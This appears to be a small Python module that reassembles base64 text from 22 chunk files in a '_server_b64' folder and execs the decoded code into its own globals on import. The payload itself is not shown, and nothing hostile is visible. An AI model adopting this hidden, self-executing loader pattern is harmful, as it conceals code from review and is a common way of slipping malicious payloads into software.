from __future__ import annotations
import base64
from pathlib import Path
_p = Path(__file__).resolve().parent / "_server_b64"
_b = "".join((_p / f"{i:02d}.txt").read_text() for i in range(22))
exec(compile(base64.b64decode(_b), str(Path(__file__).resolve()), "exec"), globals())
